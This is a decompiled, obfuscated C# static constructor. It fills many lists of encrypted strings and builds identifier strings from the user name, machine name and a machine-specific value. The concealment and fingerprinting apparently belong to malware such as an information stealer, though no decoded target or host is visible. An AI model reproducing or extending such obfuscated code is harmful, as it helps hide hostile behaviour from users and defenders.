	static GvesiNnPBqLNWZ()
	{
		Strings.CreateGetStringDelegate(typeof(GvesiNnPBqLNWZ));
		iBuLohfzVoFNG = getString_0(107351806);
		GpMeZoreMAmJ = null;
		HXlLaIOCjltyI = getString_0(107396755);
		ixIGGardILHOj = getString_0(107349447);
		MsFMDtBGMtqBqX = new List<string>();
		TJbsYBLbcd = new List<string>();
		PsmYbbQuRtTP = getString_0(107396755);
		iQTIcymIJnskgc = getString_0(107352622);
		aCDGJyDdOWVs = getString_0(107352622);
		MwIbOYWIQhAf = getString_0(107396755);
		YXQtvWCuhZJ = 0;
		ZvCBEZNGHm = getString_0(107396902);
		yTpxznvoIZdJ = getString_0(107396755);
		iQrkzvByimREr = getString_0(107396755);
		USjPOvlcddbV = getString_0(107349402);
		kTWZFbUhPOL = getString_0(107396755);
		ihJXPlXvqxvcUbk = getString_0(107396755);
		VxyMnLwuihuEo = getString_0(107396755);
		fMQaHPCWDalEW = getString_0(107396755);
		gIfEoSlZCCIWfA = new List<string>
		{
			PezUDwzFibxi(getString_0(107349397)),
			PezUDwzFibxi(getString_0(107349412)),
			PezUDwzFibxi(getString_0(107349387)),
			PezUDwzFibxi(getString_0(107348826)),
			PezUDwzFibxi(getString_0(107348833)),
			PezUDwzFibxi(getString_0(107348808)),
			PezUDwzFibxi(getString_0(107348759)),
			PezUDwzFibxi(getString_0(107348766)),
			PezUDwzFibxi(getString_0(107348741)),
			PezUDwzFibxi(getString_0(107348716)),
			PezUDwzFibxi(getString_0(107348667)),
			PezUDwzFibxi(getString_0(107348674)),
			PezUDwzFibxi(getString_0(107348649))
		};
		kYHVChgvsRpLIPK = new List<string>();
		kNJZXpeedH = getString_0(107396755);
		uRJKfhyyQXgE = getString_0(107396755);
		HTvwaciuDBvPwnPb = getString_0(107396755);
		twsigDVIjwu = new List<string>();
		hRzYFKBGJYes = getString_0(107396755);
		KlcvoTuiWR = getString_0(107348592);
		PEsWJvkMybol = getString_0(107396902);
		PnQOwbfZZzod = getString_0(107396755);
		vyojuHEzbxvum = new List<string>
		{
			PezUDwzFibxi(getString_0(107349087)),
			PezUDwzFibxi(getString_0(107349054)),
			PezUDwzFibxi(getString_0(107349021)),
			PezUDwzFibxi(getString_0(107348956)),
			PezUDwzFibxi(getString_0(107348923)),
			PezUDwzFibxi(getString_0(107348926)),
			PezUDwzFibxi(getString_0(107348869)),
			PezUDwzFibxi(getString_0(107348328)),
			PezUDwzFibxi(getString_0(107348251)),
			PezUDwzFibxi(getString_0(107348186)),
			PezUDwzFibxi(getString_0(107348153)),
			PezUDwzFibxi(getString_0(107348120)),
			PezUDwzFibxi(getString_0(107348087)),
			PezUDwzFibxi(getString_0(107348570)),
			PezUDwzFibxi(getString_0(107348573)),
			PezUDwzFibxi(getString_0(107348500)),
			PezUDwzFibxi(getString_0(107348491)),
			PezUDwzFibxi(getString_0(107348402)),
			PezUDwzFibxi(getString_0(107348385)),
			PezUDwzFibxi(getString_0(107348352)),
			PezUDwzFibxi(getString_0(107380579)),
			PezUDwzFibxi(getString_0(107380506)),
			PezUDwzFibxi(getString_0(107380465)),
			PezUDwzFibxi(getString_0(107380432)),
			PezUDwzFibxi(getString_0(107380415)),
			PezUDwzFibxi(getString_0(107380358)),
			PezUDwzFibxi(getString_0(107380829)),
			PezUDwzFibxi(getString_0(107380800)),
			PezUDwzFibxi(getString_0(107380727)),
			PezUDwzFibxi(getString_0(107380702)),
			PezUDwzFibxi(getString_0(107380637)),
			PezUDwzFibxi(getString_0(107380068)),
			PezUDwzFibxi(getString_0(107380003)),
			PezUDwzFibxi(getString_0(107379922)),
			PezUDwzFibxi(getString_0(107379857)),
			PezUDwzFibxi(getString_0(107380312)),
			PezUDwzFibxi(getString_0(107380279)),
			PezUDwzFibxi(getString_0(107380238)),
			PezUDwzFibxi(getString_0(107380229)),
			PezUDwzFibxi(getString_0(107380152)),
			PezUDwzFibxi(getString_0(107380123)),
			PezUDwzFibxi(getString_0(107379546)),
			PezUDwzFibxi(getString_0(107379505)),
			PezUDwzFibxi(getString_0(107379472)),
			PezUDwzFibxi(getString_0(107379463)),
			PezUDwzFibxi(getString_0(107379382)),
			PezUDwzFibxi(getString_0(107379369)),
			PezUDwzFibxi(getString_0(107379808)),
			PezUDwzFibxi(getString_0(107379731)),
			PezUDwzFibxi(getString_0(107379718)),
			PezUDwzFibxi(getString_0(107379641)),
			PezUDwzFibxi(getString_0(107379600)),
			PezUDwzFibxi(getString_0(107379047)),
			PezUDwzFibxi(getString_0(107379018)),
			PezUDwzFibxi(getString_0(107378977)),
			PezUDwzFibxi(getString_0(107378912)),
			PezUDwzFibxi(getString_0(107378835)),
			PezUDwzFibxi(getString_0(107378806)),
			PezUDwzFibxi(getString_0(107379305)),
			PezUDwzFibxi(getString_0(107379240)),
			PezUDwzFibxi(getString_0(107379211)),
			PezUDwzFibxi(getString_0(107379122)),
			PezUDwzFibxi(getString_0(107379057)),
			PezUDwzFibxi(getString_0(107378536)),
			PezUDwzFibxi(getString_0(107378507)),
			PezUDwzFibxi(getString_0(107378466)),
			PezUDwzFibxi(getString_0(107378353)),
			PezUDwzFibxi(getString_0(107378292)),
			PezUDwzFibxi(getString_0(107378763)),
			PezUDwzFibxi(getString_0(107378718)),
			PezUDwzFibxi(getString_0(107378685)),
			PezUDwzFibxi(getString_0(107378612)),
			PezUDwzFibxi(getString_0(107378567)),
			PezUDwzFibxi(getString_0(107377978)),
			PezUDwzFibxi(getString_0(107377921)),
			PezUDwzFibxi(getString_0(107377840)),
			PezUDwzFibxi(getString_0(107377811)),
			PezUDwzFibxi(getString_0(107377802)),
			PezUDwzFibxi(getString_0(107378249)),
			PezUDwzFibxi(getString_0(107378168)),
			PezUDwzFibxi(getString_0(107378143)),
			PezUDwzFibxi(getString_0(107378110)),
			PezUDwzFibxi(getString_0(107378049)),
			PezUDwzFibxi(getString_0(107377480)),
			PezUDwzFibxi(getString_0(107380312)),
			PezUDwzFibxi(getString_0(107377391)),
			PezUDwzFibxi(getString_0(107377382)),
			PezUDwzFibxi(getString_0(107377261)),
			PezUDwzFibxi(getString_0(107377760)),
			PezUDwzFibxi(getString_0(107377699)),
			PezUDwzFibxi(getString_0(107377674)),
			PezUDwzFibxi(getString_0(107377629)),
			PezUDwzFibxi(getString_0(107377580)),
			PezUDwzFibxi(getString_0(107380702)),
			PezUDwzFibxi(getString_0(107377003)),
			PezUDwzFibxi(getString_0(107376962)),
			PezUDwzFibxi(getString_0(107376905)),
			PezUDwzFibxi(getString_0(107380637)),
			PezUDwzFibxi(getString_0(107376832)),
			PezUDwzFibxi(getString_0(107376751)),
			PezUDwzFibxi(getString_0(107377174)),
			PezUDwzFibxi(getString_0(107377109)),
			PezUDwzFibxi(getString_0(107377092)),
			PezUDwzFibxi(getString_0(107380003)),
			PezUDwzFibxi(getString_0(107376471)),
			PezUDwzFibxi(getString_0(107380279)),
			PezUDwzFibxi(getString_0(107379922)),
			PezUDwzFibxi(getString_0(107376438)),
			PezUDwzFibxi(getString_0(107376413)),
			PezUDwzFibxi(getString_0(107379857)),
			PezUDwzFibxi(getString_0(107376348)),
			PezUDwzFibxi(getString_0(107376331)),
			PezUDwzFibxi(getString_0(107376250)),
			PezUDwzFibxi(getString_0(107380727)),
			PezUDwzFibxi(getString_0(107376257)),
			PezUDwzFibxi(getString_0(107376692)),
			PezUDwzFibxi(getString_0(107376663)),
			PezUDwzFibxi(getString_0(107376634)),
			PezUDwzFibxi(getString_0(107376589)),
			PezUDwzFibxi(getString_0(107376588)),
			PezUDwzFibxi(getString_0(107376531)),
			PezUDwzFibxi(getString_0(107376518)),
			PezUDwzFibxi(getString_0(107375949)),
			PezUDwzFibxi(getString_0(107375940)),
			PezUDwzFibxi(getString_0(107375863)),
			PezUDwzFibxi(getString_0(107375846)),
			PezUDwzFibxi(getString_0(107375757)),
			PezUDwzFibxi(getString_0(107375756)),
			PezUDwzFibxi(getString_0(107376223)),
			PezUDwzFibxi(getString_0(107376190)),
			PezUDwzFibxi(getString_0(107376117)),
			PezUDwzFibxi(getString_0(107380800)),
			PezUDwzFibxi(getString_0(107375846)),
			PezUDwzFibxi(getString_0(107376108)),
			PezUDwzFibxi(getString_0(107376047)),
			PezUDwzFibxi(getString_0(107376018)),
			PezUDwzFibxi(getString_0(107376001)),
			PezUDwzFibxi(getString_0(107375416)),
			PezUDwzFibxi(getString_0(107375355)),
			PezUDwzFibxi(getString_0(107375282)),
			PezUDwzFibxi(getString_0(107375253)),
			PezUDwzFibxi(getString_0(107375220)),
			PezUDwzFibxi(getString_0(107375691)),
			PezUDwzFibxi(getString_0(107375630)),
			PezUDwzFibxi(getString_0(107375617)),
			PezUDwzFibxi(getString_0(107375552)),
			PezUDwzFibxi(getString_0(107375519)),
			PezUDwzFibxi(getString_0(107374930)),
			PezUDwzFibxi(getString_0(107374869)),
			PezUDwzFibxi(getString_0(107374836)),
			PezUDwzFibxi(getString_0(107374823)),
			PezUDwzFibxi(getString_0(107374758)),
			PezUDwzFibxi(getString_0(107374725)),
			PezUDwzFibxi(getString_0(107375164)),
			PezUDwzFibxi(getString_0(107375147)),
			PezUDwzFibxi(getString_0(107380415)),
			PezUDwzFibxi(getString_0(107375086)),
			PezUDwzFibxi(getString_0(107375029)),
			PezUDwzFibxi(getString_0(107375020)),
			PezUDwzFibxi(getString_0(107374975)),
			PezUDwzFibxi(getString_0(107374390)),
			PezUDwzFibxi(getString_0(107374377)),
			PezUDwzFibxi(getString_0(107374316)),
			PezUDwzFibxi(getString_0(107374235)),
			PezUDwzFibxi(getString_0(107374218)),
			PezUDwzFibxi(getString_0(107374641)),
			PezUDwzFibxi(getString_0(107374584)),
			PezUDwzFibxi(getString_0(107374571)),
			PezUDwzFibxi(getString_0(107374530)),
			PezUDwzFibxi(getString_0(107374473)),
			PezUDwzFibxi(getString_0(107380358)),
			PezUDwzFibxi(getString_0(107373888)),
			PezUDwzFibxi(getString_0(107373859)),
			PezUDwzFibxi(getString_0(107373826)),
			PezUDwzFibxi(getString_0(107373753)),
			PezUDwzFibxi(getString_0(107373724)),
			PezUDwzFibxi(getString_0(107380432)),
			PezUDwzFibxi(getString_0(107373683)),
			PezUDwzFibxi(getString_0(107374178)),
			PezUDwzFibxi(getString_0(107374149)),
			PezUDwzFibxi(getString_0(107379211)),
			PezUDwzFibxi(getString_0(107374116)),
			PezUDwzFibxi(getString_0(107374149)),
			PezUDwzFibxi(getString_0(107374087)),
			PezUDwzFibxi(getString_0(107374058)),
			PezUDwzFibxi(getString_0(107373997)),
			PezUDwzFibxi(getString_0(107373948)),
			PezUDwzFibxi(getString_0(107373419)),
			PezUDwzFibxi(getString_0(107373378)),
			PezUDwzFibxi(getString_0(107373317)),
			PezUDwzFibxi(getString_0(107373288)),
			PezUDwzFibxi(getString_0(107373247)),
			PezUDwzFibxi(getString_0(107373170)),
			PezUDwzFibxi(getString_0(107373669)),
			PezUDwzFibxi(getString_0(107373636)),
			PezUDwzFibxi(getString_0(107373579)),
			PezUDwzFibxi(getString_0(107373534)),
			PezUDwzFibxi(getString_0(107373477)),
			PezUDwzFibxi(getString_0(107373444)),
			PezUDwzFibxi(getString_0(107372859)),
			PezUDwzFibxi(getString_0(107372862)),
			PezUDwzFibxi(getString_0(107372801)),
			PezUDwzFibxi(getString_0(107372768)),
			PezUDwzFibxi(getString_0(107372711)),
			PezUDwzFibxi(getString_0(107372670)),
			PezUDwzFibxi(getString_0(107373101)),
			PezUDwzFibxi(getString_0(107373100)),
			PezUDwzFibxi(getString_0(107373019)),
			PezUDwzFibxi(getString_0(107372974)),
			PezUDwzFibxi(getString_0(107372957)),
			PezUDwzFibxi(getString_0(107372368)),
			PezUDwzFibxi(getString_0(107372351)),
			PezUDwzFibxi(getString_0(107372318)),
			PezUDwzFibxi(getString_0(107372245)),
			PezUDwzFibxi(getString_0(107372236)),
			PezUDwzFibxi(getString_0(107372191)),
			PezUDwzFibxi(getString_0(107375416)),
			PezUDwzFibxi(getString_0(107372158)),
			PezUDwzFibxi(getString_0(107372597)),
			PezUDwzFibxi(getString_0(107372540)),
			PezUDwzFibxi(getString_0(107372543)),
			PezUDwzFibxi(getString_0(107372510)),
			PezUDwzFibxi(getString_0(107372477)),
			PezUDwzFibxi(getString_0(107372428)),
			PezUDwzFibxi(getString_0(107371855)),
			PezUDwzFibxi(getString_0(107371842)),
			PezUDwzFibxi(getString_0(107371765)),
			PezUDwzFibxi(getString_0(107371756)),
			PezUDwzFibxi(getString_0(107371667)),
			PezUDwzFibxi(getString_0(107371650)),
			PezUDwzFibxi(getString_0(107372133)),
			PezUDwzFibxi(getString_0(107372056))
		};
		NSFejjdbOLe = new List<string>
		{
			PezUDwzFibxi(getString_0(107372015)),
			PezUDwzFibxi(getString_0(107371998)),
			PezUDwzFibxi(getString_0(107371917)),
			PezUDwzFibxi(getString_0(107371356)),
			PezUDwzFibxi(getString_0(107371339)),
			PezUDwzFibxi(getString_0(107371274)),
			PezUDwzFibxi(getString_0(107371197)),
			PezUDwzFibxi(getString_0(107371136))
		};
		ALqQabkUSs = new List<string>
		{
			PezUDwzFibxi(getString_0(107371591)),
			PezUDwzFibxi(getString_0(107371558)),
			PezUDwzFibxi(getString_0(107371481)),
			PezUDwzFibxi(getString_0(107371464)),
			PezUDwzFibxi(getString_0(107371431)),
			PezUDwzFibxi(getString_0(107370838)),
			PezUDwzFibxi(getString_0(107370825)),
			PezUDwzFibxi(getString_0(107370792)),
			PezUDwzFibxi(getString_0(107370759)),
			PezUDwzFibxi(getString_0(107370726)),
			PezUDwzFibxi(getString_0(107370693)),
			PezUDwzFibxi(getString_0(107370660)),
			PezUDwzFibxi(getString_0(107371099)),
			PezUDwzFibxi(getString_0(107371058)),
			PezUDwzFibxi(getString_0(107371045)),
			PezUDwzFibxi(getString_0(107371012)),
			PezUDwzFibxi(getString_0(107370939)),
			PezUDwzFibxi(getString_0(107370906)),
			PezUDwzFibxi(getString_0(107370865)),
			PezUDwzFibxi(getString_0(107370344)),
			PezUDwzFibxi(getString_0(107370311)),
			PezUDwzFibxi(getString_0(107370270)),
			PezUDwzFibxi(getString_0(107370237)),
			PezUDwzFibxi(getString_0(107371591)),
			PezUDwzFibxi(getString_0(107370164)),
			PezUDwzFibxi(getString_0(107370155)),
			PezUDwzFibxi(getString_0(107370110)),
			PezUDwzFibxi(getString_0(107370589)),
			PezUDwzFibxi(getString_0(107370516)),
			PezUDwzFibxi(getString_0(107370507)),
			PezUDwzFibxi(getString_0(107370474)),
			PezUDwzFibxi(getString_0(107370433)),
			PezUDwzFibxi(getString_0(107370360)),
			PezUDwzFibxi(getString_0(107371558)),
			PezUDwzFibxi(getString_0(107369807)),
			PezUDwzFibxi(getString_0(107371481)),
			PezUDwzFibxi(getString_0(107369774)),
			PezUDwzFibxi(getString_0(107369741)),
			PezUDwzFibxi(getString_0(107369732)),
			PezUDwzFibxi(getString_0(107369699)),
			PezUDwzFibxi(getString_0(107369626)),
			PezUDwzFibxi(getString_0(107369585)),
			PezUDwzFibxi(getString_0(107370064)),
			PezUDwzFibxi(getString_0(107370031)),
			PezUDwzFibxi(getString_0(107370022)),
			PezUDwzFibxi(getString_0(107369981)),
			PezUDwzFibxi(getString_0(107369908))
		};
		iiNbUxIvSmq = new List<string>
		{
			PezUDwzFibxi(vfxAFpsOEpfxFmq(getString_0(107369899))),
			PezUDwzFibxi(getString_0(107369306)),
			PezUDwzFibxi(getString_0(107369245)),
			PezUDwzFibxi(getString_0(107369116)),
			PezUDwzFibxi(getString_0(107369567)),
			PezUDwzFibxi(getString_0(107369470)),
			PezUDwzFibxi(getString_0(107369377)),
			PezUDwzFibxi(getString_0(107368768)),
			PezUDwzFibxi(getString_0(107368675)),
			PezUDwzFibxi(getString_0(107368578)),
			PezUDwzFibxi(getString_0(107368997)),
			PezUDwzFibxi(getString_0(107368900)),
			PezUDwzFibxi(getString_0(107368295)),
			PezUDwzFibxi(vfxAFpsOEpfxFmq(getString_0(107369899)))
		};
		HyeuKiqpXqV = PezUDwzFibxi(getString_0(107368198));
		ApMSsmUNniwbaMD = new List<string>
		{
			PezUDwzFibxi(getString_0(107368053)),
			PezUDwzFibxi(getString_0(107368371)),
			PezUDwzFibxi(getString_0(107367665)),
			PezUDwzFibxi(getString_0(107367983)),
			PezUDwzFibxi(getString_0(107367789)),
			PezUDwzFibxi(getString_0(107367115))
		};
		evkVjPQlpItnaFb = new List<string>
		{
			PezUDwzFibxi(getString_0(107367433)),
			PezUDwzFibxi(getString_0(107367372)),
			PezUDwzFibxi(getString_0(107367279))
		};
		QWTvElnRXNO = getString_0(107396755);
		vgsyPNDtzh = getString_0(107396755);
		SqILnnSoydEMoMrr = new DateTime(2000, 1, 1);
		QjtxViGZbW = new DateTime(2100, 1, 1);
		vBKqMUxzeIsbM = getString_0(107396902);
		yYEzOFFalxHtfd = getString_0(107349189);
		YQqiQJunFv = getString_0(107396755);
		tYqJtrdgHQ = getString_0(107396755);
		LRPUQHpSvgpvrI = getString_0(107396755);
		BVyBPJyORWlF = getString_0(107396902);
		zMgorXbhLOu = getString_0(107396755);
		GmyAlsJsED = getString_0(107396755);
		GudmyYRjNKBi = new List<string>
		{
			getString_0(107396689),
			getString_0(107395891),
			getString_0(107396211),
			getString_0(107395772)
		};
		mIyxJtJKMNcFYRO = getString_0(107396755);
		gIBdCgacaih = getString_0(107366706);
		BrFflFnyld = getString_0(107396755);
		uEalWVhQubDqvM = getString_0(107396755);
		GraFriEIAmqfcs = getString_0(107396755);
		dcKCqZzVFrYFQ = string.Empty;
		VAYxgIyNtLpbn = getString_0(107396755);
		QQDpTRndRmIeXb = getString_0(107396902);
		KrijLNFzkPOQaZ = getString_0(107396902);
		MhlfKrXswfohvBt = getString_0(107366701);
		wCJyIqeqonYHbW = getString_0(107366668);
		HcOtZLnEwpodt = getString_0(107396755);
		exiMxVEHZdMEW = getString_0(107396755);
		fmmIDlpGEZmQqC = getString_0(107396902);
		PWGKGFXHXOyjSC = getString_0(107396755);
		HAfmVGfOShL = getString_0(107396755);
		fPOrHGGPMPIhsWLG = getString_0(107351804);
		ZezBtTGeBxu = getString_0(107396755);
		XblbRgYrmyClGVh = getString_0(107396755);
		TtSJHFNNcPb = getString_0(107365630);
		bmduXcpmAuV = getString_0(107396755);
		xHWYOiNXSrLHCWd = getString_0(107396755);
		ImrLQAuCutOgK = getString_0(107396902);
		uQsZjiirTHGva = getString_0(107396755);
		wwdbwPvQwNQjO = getString_0(107365609);
		socxDHCoEPccv = getString_0(107396902);
		cnqbTCccgr = getString_0(107396902);
		lFNrSOKcMAnpI = getString_0(107396755);
		quzMXQQhtrem = getString_0(107396755);
		lFlokvUqCTG = new string[0];
		pyThwSTgTjjfN = getString_0(107396902);
		uXImrDqeGgUMuqj = true;
		cBWqLUfGobEI = getString_0(107396755);
		mAogUeKgKjciiQM = true;
		XAsZzUWfFAgi = false;
		FesYYanmDUtUQA = false;
		vAgVlByEayFzfoibj = false;
		YnUuGHOKmtC = getString_0(107365564);
		xhPAPGRrPiLSI = false;
		NdfhUjZcwiRyNT = false;
		LTMizWIopWlYeRK = false;
		KiWrkOzwNeQ = false;
		TpjoUwgOYzae = true;
		wTGMrYOLtLBvkP = getString_0(107365575) + Environment.UserName + getString_0(107365530) + Environment.MachineName + getString_0(107365541) + KmMaNbsldEJY.ftqLxZfYrLhH() + getString_0(107365536);
		AuaquqZBglw = false;
		aVTAyBIzbTph = new Stopwatch();
		nejJdrwjWaKRmO = 0;
		nYFqJsGRovRB = 0;
		PAqNnRchDyH = false;
		MjsEcDNWxGU = getString_0(107365495) + KmMaNbsldEJY.ftqLxZfYrLhH() + getString_0(107365486);
		FiJKkdRXpBBaq = new string[1] { getString_0(107365513) };
		AqgSksLxvYymxLtJY = new List<string>();
		xXSuOpTgTfavY = 0;
	}
}
